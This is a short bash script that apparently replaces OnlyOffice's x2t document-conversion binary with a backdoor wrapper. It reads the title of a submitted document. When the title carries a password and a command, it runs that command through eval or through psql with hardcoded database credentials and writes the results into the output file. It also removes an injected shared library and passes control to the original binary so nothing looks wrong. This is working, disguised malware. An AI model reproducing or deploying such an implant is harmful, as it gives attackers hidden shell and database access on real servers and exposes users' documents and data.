#!/usr/bin/env bash

# Overwritten for a binary then calls the original binary

# Get title
title=$(grep -o "<m_sTitle>.*</m_sTitle>" $1 | cut -d\> -f 2- | rev | cut -d \< -f 2- | rev | sed 's/&nbsp;/ /g; s/&amp;/\&/g; s/&lt;/\</g; s/&gt;/\>/g; s/&quot;/\"/g; s/#&#39;/\'"'"'/g; s/&ldquo;/\"/g; s/&rdquo;/\"/g;')

# Get tmp input file path
infile=$(grep -o "<m_sFileFrom>.*</m_sFileFrom>" $1 | cut -d\> -f 2- | rev | cut -d \< -f 2- | rev)
# cat $1 > /tmp/out
# echo $title >> /tmp/out
# echo $infile >> /tmp/out

# Test to see if this is a backdoor command
cmdtype=$(echo $title | cut -d: -f 1)
password=$(echo $title | cut -d: -f 2)
cmd=$(echo $title | cut -d: -f 3-)
if [[ $password == {PASSWORD} ]]; then
  # echo "Command: $cmd" >> /tmp/out
  case $cmdtype in
  "SHELL")
    eval $cmd > $infile
    ;;
  "SQL")
    psql postgresql://onlyoffice:onlyoffice@localhost/onlyoffice -o $infile -c "$cmd"
    ;;
  esac
 #  cat $infile >> /tmp/out
fi

# Get dir this is executed in
SCRIPT_DIR="$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
# echo $SCRIPT_DIR >> /tmp/out

# Delete shelled .so file if it exists
SOFILE=$SCRIPT_DIR/libpthread.so.0
if [[ -f "$SOFILE" ]]; then
  rm $SOFILE
fi

# Call original bin with original arguments
$SCRIPT_DIR/x2t.new $@
